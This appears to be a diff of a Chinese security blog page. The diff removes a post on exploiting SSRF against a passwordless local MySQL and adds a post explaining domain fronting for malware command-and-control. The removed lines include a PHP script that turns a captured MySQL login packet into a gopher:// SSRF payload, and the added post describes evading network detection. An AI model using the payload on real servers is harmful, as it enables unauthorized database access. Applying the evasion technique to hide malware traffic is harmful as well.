@@ -79,21 +79,20 @@
 
 
 
-<meta name="description" content="首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。mysql要使用TCP/IP协议进行连接1mysql -h127.0.0.1 -uroot 然后使用tcpdump进行抓取数据包 1tcpdump –i lo port 3306 –w mysql.pcay 对抓取到的数据包进行查看，使用wireshark查看查看一条数据，数据查看方式选择TCP流，选择方式如下图这个数据然">
+<meta name="description" content="一、 概念主要是一种隐蔽连接真实2c来躲避互联网审查的技术。在应用层运作是，域名前置可以使用户通过https来连接到被屏蔽的服务，而表面上像是预另一个完全不同的站点通讯。 二、常见的远控模型 当客户端运行恶意程序是会联系cc.com,一般情况下，cc.com是一个生僻的域名，部署在网络边界的行为检测系统就会发现异常流量并进行预警或者阻止，那么就没有办法与cc进行正常的通讯。 三、支持Domain">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ssrf+本地MySQL空密码的利用">
-<meta property="og:url" content="http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/index.html">
+<meta property="og:title" content="域名前置(Domain Fronting)">
+<meta property="og:url" content="http://yangge.me/2019/04/24/域名前置-Domain-Fronting/index.html">
 <meta property="og:site_name">
-<meta property="og:description" content="首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。mysql要使用TCP/IP协议进行连接1mysql -h127.0.0.1 -uroot 然后使用tcpdump进行抓取数据包 1tcpdump –i lo port 3306 –w mysql.pcay 对抓取到的数据包进行查看，使用wireshark查看查看一条数据，数据查看方式选择TCP流，选择方式如下图这个数据然">
+<meta property="og:description" content="一、 概念主要是一种隐蔽连接真实2c来躲避互联网审查的技术。在应用层运作是，域名前置可以使用户通过https来连接到被屏蔽的服务，而表面上像是预另一个完全不同的站点通讯。 二、常见的远控模型 当客户端运行恶意程序是会联系cc.com,一般情况下，cc.com是一个生僻的域名，部署在网络边界的行为检测系统就会发现异常流量并进行预警或者阻止，那么就没有办法与cc进行正常的通讯。 三、支持Domain">
 <meta property="og:locale" content="Zh/Cn">
-<meta property="og:image" content="https://i.loli.net/2018/01/26/5a6ad2dcacfd0.png">
-<meta property="og:image" content="https://i.loli.net/2018/01/26/5a6ad4e079521.png">
-<meta property="og:image" content="https://i.loli.net/2018/01/26/5a6ad4e07add5.png">
-<meta property="og:updated_time" content="2018-01-26T07:16:20.000Z">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cbfd6fb9ab10.jpg">
+<meta property="og:image" content="https://i.loli.net/2019/04/24/5cbffcf88b5d4.jpg">
+<meta property="og:updated_time" content="2019-04-24T06:13:41.730Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ssrf+本地MySQL空密码的利用">
-<meta name="twitter:description" content="首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。mysql要使用TCP/IP协议进行连接1mysql -h127.0.0.1 -uroot 然后使用tcpdump进行抓取数据包 1tcpdump –i lo port 3306 –w mysql.pcay 对抓取到的数据包进行查看，使用wireshark查看查看一条数据，数据查看方式选择TCP流，选择方式如下图这个数据然">
-<meta name="twitter:image" content="https://i.loli.net/2018/01/26/5a6ad2dcacfd0.png">
+<meta name="twitter:title" content="域名前置(Domain Fronting)">
+<meta name="twitter:description" content="一、 概念主要是一种隐蔽连接真实2c来躲避互联网审查的技术。在应用层运作是，域名前置可以使用户通过https来连接到被屏蔽的服务，而表面上像是预另一个完全不同的站点通讯。 二、常见的远控模型 当客户端运行恶意程序是会联系cc.com,一般情况下，cc.com是一个生僻的域名，部署在网络边界的行为检测系统就会发现异常流量并进行预警或者阻止，那么就没有办法与cc进行正常的通讯。 三、支持Domain">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/24/5cbfd6fb9ab10.jpg">
 
 
 
@@ -123,13 +122,13 @@
 
 
 
-  <link rel="canonical" href="http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/"/>
+  <link rel="canonical" href="http://yangge.me/2019/04/24/域名前置-Domain-Fronting/"/>
 
 
 
 
 
-  <title>ssrf+本地MySQL空密码的利用 | </title>
+  <title>域名前置(Domain Fronting) | </title>
   
 
 
@@ -236,7 +235,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/">
+    <link itemprop="mainEntityOfPage" href="http://yangge.me/2019/04/24/域名前置-Domain-Fronting/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="yangge">
@@ -253,7 +252,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">ssrf+本地MySQL空密码的利用</h1>
+          <h1 class="post-title" itemprop="name headline">域名前置(Domain Fronting)</h1>
         
 
         <div class="post-meta">
@@ -265,8 +264,8 @@
               
                 <span class="post-meta-item-text">Posted on</span>
               
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-01-26T14:53:43+08:00">
-                2018-01-26
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-24T11:11:19+08:00">
+                2019-04-24
               </time>
             
 
@@ -284,9 +283,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2018/01/26/ssrf-本地MySQL空密码的利用/#comments" itemprop="discussionUrl">
+                <a href="/2019/04/24/域名前置-Domain-Fronting/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2018/01/26/ssrf-本地MySQL空密码的利用/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2019/04/24/域名前置-Domain-Fronting/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -314,11 +313,11 @@
       
 
       
-        <p>首先我们要在本地进行利用wireshark抓取一下mysql空密码的数据包。<br>mysql要使用TCP/IP协议进行连接<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -h127.0.0.1 -uroot</span><br></pre></td></tr></table></figure></p>
-<p>然后使用tcpdump进行抓取数据包</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump –i lo port 3306 –w mysql.pcay</span><br></pre></td></tr></table></figure>
-<p>对抓取到的数据包进行查看，使用wireshark查看<br><img src="https://i.loli.net/2018/01/26/5a6ad2dcacfd0.png" alt=""><br>查看一条数据，数据查看方式选择TCP流，选择方式如下图<br><img src="https://i.loli.net/2018/01/26/5a6ad4e079521.png" alt=""><br>这个数据然后再进行因为是tcp流的，我们需要对其进行每两个字符添加%进行url编码，代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;a800000185a6ff0100000001210000000000000000000000000000000000000000000000757365726e6f7061737300006d7973716c5f6e61746976655f70617373776f72640065035f6f73054c696e75780c5f636c69656e745f6e616d65086c69626d7973716c045f70696404333630390f5f636c69656e745f76657273696f6e06352e372e3231095f706c6174666f726d067838365f36340c70726f6772616d5f6e616d65056d7973716c210000000373656c65637420404076657273696f6e5f636f6d6d656e74206c696d697420310100000001&quot;;</span><br><span class="line">for($i=0;$i&lt;=strlen($url);$i=$i+3)</span><br><span class="line">&#123;</span><br><span class="line">	$url = substr_replace($url,&apos;%&apos;,$i,0);</span><br><span class="line">&#125;</span><br><span class="line">$url_gopher = &quot;gopher://127.0.0.1:3306/_&quot; . $url;</span><br><span class="line">echo $url_gopher . &quot;\r\n&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后进行利用<br><img src="https://i.loli.net/2018/01/26/5a6ad4e07add5.png" alt=""></p>
+        <h4 id="一、-概念"><a href="#一、-概念" class="headerlink" title="一、 概念"></a>一、 概念</h4><p><code>主要是一种隐蔽连接真实2c来躲避互联网审查的技术。在应用层运作是，域名前置可以使用户通过https来连接到被屏蔽的服务，而表面上像是预另一个完全不同的站点通讯。</code></p>
+<h4 id="二、常见的远控模型"><a href="#二、常见的远控模型" class="headerlink" title="二、常见的远控模型"></a>二、常见的远控模型</h4><p><img src="https://i.loli.net/2019/04/24/5cbfd6fb9ab10.jpg" alt=""></p>
+<p>当客户端运行恶意程序是会联系cc.com,一般情况下，cc.com是一个生僻的域名，部署在网络边界的行为检测系统就会发现异常流量并进行预警或者阻止，那么就没有办法与cc进行正常的通讯。</p>
+<h4 id="三、支持Domain-Fronting的恶意代码远控模型"><a href="#三、支持Domain-Fronting的恶意代码远控模型" class="headerlink" title="三、支持Domain Fronting的恶意代码远控模型"></a>三、支持Domain Fronting的恶意代码远控模型</h4><p><img src="https://i.loli.net/2019/04/24/5cbffcf88b5d4.jpg" alt=""></p>
+<p>为啥可以绕过行为检测呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.白名单域名</span><br><span class="line">2.https</span><br><span class="line">3.即使知道google可能是恶意cc，也不能封禁</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -343,15 +342,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2019/03/29/python3-设置gopher服务端/" rel="next" title="python3 设置gopher服务端">
+                <i class="fa fa-chevron-left"></i> python3 设置gopher服务端
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/01/26/自动扫描域名-c段扫描脚本/" rel="prev" title="自动扫描域名+c段扫描脚本">
-                自动扫描域名+c段扫描脚本 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -413,8 +412,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
 
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -476,6 +484,22 @@
         </div>
       </section>
 
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#一、-概念"><span class="nav-number">1.</span> <span class="nav-text">一、 概念</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#二、常见的远控模型"><span class="nav-number">2.</span> <span class="nav-text">二、常见的远控模型</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#三、支持Domain-Fronting的恶意代码远控模型"><span class="nav-number">3.</span> <span class="nav-text">三、支持Domain Fronting的恶意代码远控模型</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
       
 
       
@@ -640,9 +664,9 @@
     
       <script type="text/javascript">
         var disqus_config = function () {
-          this.page.url = 'http://yangge.me/2018/01/26/ssrf-本地MySQL空密码的利用/';
-          this.page.identifier = '2018/01/26/ssrf-本地MySQL空密码的利用/';
-          this.page.title = 'ssrf+本地MySQL空密码的利用';
+          this.page.url = 'http://yangge.me/2019/04/24/域名前置-Domain-Fronting/';
+          this.page.identifier = '2019/04/24/域名前置-Domain-Fronting/';
+          this.page.title = '域名前置(Domain Fronting)';
         };
         var d = document, s = d.createElement('script');
         s.src = 'https://yangge.disqus.com/embed.js';
